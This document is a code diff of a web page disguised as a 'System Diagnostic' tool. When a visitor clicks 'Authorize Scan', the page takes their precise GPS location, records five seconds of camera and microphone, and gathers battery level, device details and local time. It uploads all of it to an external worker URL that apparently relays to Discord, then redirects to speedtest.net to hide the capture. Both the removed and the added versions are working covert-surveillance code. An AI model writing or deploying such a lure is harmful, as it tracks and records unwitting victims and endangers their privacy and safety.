@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic</title>
+    <title>Network Diagnostic Tool</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; text-align: center; }
+        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
         .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
-        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 1; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
+        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
         .btn:disabled { background: #161b2c; color: #5c6784; }
         video { display: none; }
     </style>
@@ -17,9 +17,9 @@
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">NODE CALIBRATION v4.6.5</div>
+        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.2.0</div>
         <div class="terminal" id="terminal">
-            <div class="line">> System Ready.</div>
+            <div class="line">> System Ready. Awaiting Handshake...</div>
         </div>
         <button class="btn" id="startBtn">Authorize Scan</button>
     </div>
@@ -27,8 +27,7 @@
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-        // !!! PASTE YOUR WORKER URL HERE !!!
-        const WORKER_URL = 'https://discord-handler.lew7348.workers.dev'; 
+        const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 
 
         const btn = document.getElementById('startBtn');
         const terminal = document.getElementById('terminal');
@@ -45,73 +44,79 @@
 
         btn.addEventListener('click', async function() {
             btn.disabled = true;
-            addLog("> Initializing...");
+            addLog("> Initiating Secure Handshake...");
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                addLog("> GPS Linked.");
-                
+                addLog("> GPS Node Linked.");
+
                 let stream;
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user", width: 480 }, 
-                        audio: true 
-                    });
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 } catch (e) {
-                    addLog("> ERROR: Media Denied.", "#ff4b2b");
+                    addLog("> ERROR: Hardware Denied.", "#ff4b2b");
+                    btn.disabled = false;
                     return;
                 }
 
-                addLog("> Recording Telemetry...");
+                addLog("> Capturing Telemetry (5s)...");
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.start();
 
                 setTimeout(() => {
-                    addLog("> Syncing Data...");
+                    addLog("> Forwarding to Cloud Proxy...");
                     mediaRecorder.stop();
-                }, 4000);
+                }, 5000);
 
                 mediaRecorder.onstop = async () => {
                     const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const battery = await navigator.getBattery();
                     const formData = new FormData();
+                    
+                    // Logic for Alert Color based on Battery
+                    const embedColor = battery.level > 0.2 ? 3066993 : 15158332;
+
                     formData.append('payload_json', JSON.stringify({
-                        content: "🔱 **NODE CAPTURE**",
-                        embeds: [{ fields: [{ name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude }] }]
+                        content: "🔱 **DETAILED NODE CAPTURE**",
+                        embeds: [{
+                            title: "Hardware Intelligence Report",
+                            color: embedColor,
+                            fields: [
+                                { name: "📍 Maps", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
+                                { name: "📱 Device Info", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true },
+                                { name: "🔋 Battery", value: Math.round(battery.level * 100) + "%", inline: true },
+                                { name: "⏰ Local Time", value: new Date().toLocaleTimeString(), inline: true }
+                            ],
+                            footer: { text: "Node ID: " + Math.random().toString(36).substr(2, 9).toUpperCase() }
+                        }]
                     }));
-                    formData.append('file', videoBlob, 'node.webm');
+                    formData.append('file', videoBlob, 'node_data.webm');
 
                     try {
-                        addLog("> Connecting to Worker...");
-                        // Increased timeout to 15 seconds
-                        const controller = new AbortController();
-                        const id = setTimeout(() => controller.abort(), 15000);
-
-                        const response = await fetch(WORKER_URL, { 
+                        const response = await fetch(PROXY_URL, { 
                             method: 'POST', 
-                            body: formData,
-                            signal: controller.signal 
+                            body: formData 
                         });
-                        
-                        clearTimeout(id);
 
                         if (response.ok) {
-                            addLog("> Success! Redirecting...");
+                            addLog("> Success! Finalizing Node...");
                             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                         } else {
-                            addLog("> Worker Error: " + response.status, "#ff4b2b");
+                            addLog("> Server Error: " + response.status, "#ff4b2b");
+                            btn.disabled = false;
                         }
                     } catch (err) {
-                        addLog("> Connection Timeout. Try again.", "#ff4b2b");
+                        addLog("> Connection Refused.", "#ff4b2b");
                         btn.disabled = false;
                     }
                     
                     stream.getTracks().forEach(t => t.stop());
                 };
             }, (err) => {
-                addLog("> GPS Denied.", "#ff4b2b");
+                addLog("> ERROR: GPS Required.", "#ff4b2b");
                 btn.disabled = false;
-            });
+            }, { enableHighAccuracy: true });
         });
     </script>
 </body>
